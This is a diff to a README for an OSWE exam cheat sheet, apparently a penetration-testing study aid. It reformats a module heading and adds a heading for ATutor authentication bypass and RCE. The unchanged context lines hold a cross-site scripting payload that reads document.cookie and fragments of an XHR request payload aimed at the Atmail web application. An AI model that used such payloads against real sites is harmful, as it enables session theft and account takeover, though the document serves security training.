@@ -1,7 +1,7 @@
 # OSWE-cheat-sheet
 OSWE-cheat sheet module by module with updated syllabus:
 
-Module Atmail :
+Module : Atmail :
 
 1. Access and alert cookie payload (Httponly flag should be disable in set-Cookie headers)<br>
     #<script>alert(document.cookie);</script>
@@ -30,5 +30,5 @@ Module Atmail :
     #xhr.open("GET", url, true)<br>
     #xhr.send()<br>
 
-    
+ Module : ATutor Authentication Bypass and RCE :
     
